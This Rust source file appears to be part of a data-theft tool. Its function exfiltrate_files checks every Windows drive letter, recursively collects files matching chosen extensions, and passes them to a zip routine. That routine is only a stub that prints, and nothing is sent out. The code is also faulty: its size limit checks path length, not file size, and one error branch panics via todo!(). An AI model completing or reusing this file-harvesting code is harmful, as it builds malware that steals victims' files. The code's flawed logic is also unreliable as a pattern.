use crate::PathBuf;
use std::fs;
use std::io;

pub fn check_disks(path: PathBuf, disks: &mut Vec<PathBuf>) -> Result<(), std::io::Error> {
    if path.exists() {
        disks.push(path);
    }

    Ok(())
}

pub fn list_files(path: PathBuf, _files_to_extract: &Vec<String>, _max_file_size: u64, files: &mut Vec<PathBuf>) -> Result<(), io::Error> {
    match fs::read_dir(path) {
        Ok(paths) => {
            for path_result in paths {
                match path_result {
                    Ok(path) => {
                        if path.file_type().unwrap().is_dir() {
                            if let Err(_e) = list_files(path.path(), &_files_to_extract.clone(), _max_file_size, files) {
                                continue
                            }
                        } else {
                            for file_ext in _files_to_extract {
                                let clean_path = path.path().display().to_string();
                                if clean_path.ends_with(file_ext) {
                                    if clean_path.len() < _max_file_size.try_into().unwrap() {
                                        files.push(path.path());
                                    }
                                }
                            }
                        }
                    }
                    Err(_e) => todo!()
                }
            }
            Ok(())
        }
        Err(e) => {
            Err(e)
        }
    }
}

pub fn create_zip(files: Vec<PathBuf>, zip_path: String) {
    println!("Creating zip on {} with {} files", zip_path, files.len());
}

pub fn exfiltrate_files(_files_to_extract: Vec<String>, _max_file_size: u64, zip_path: String) {
    let mut disks: Vec<PathBuf> = Vec::new();
    let mut files: Vec<PathBuf> = Vec::new();

    for letter in 'A'..='Z' {
        let drive_path = PathBuf::from(format!("{letter}:\\"));

        if let Err(e) = check_disks(drive_path, &mut disks) {
            println!("Error: {}", e);
        }
    }

    for disk in disks {
        if let Err(e) = list_files(disk, &_files_to_extract, _max_file_size, &mut files) {
            eprintln!("Error: {}", e);
        }
    }

    create_zip(files, zip_path);
}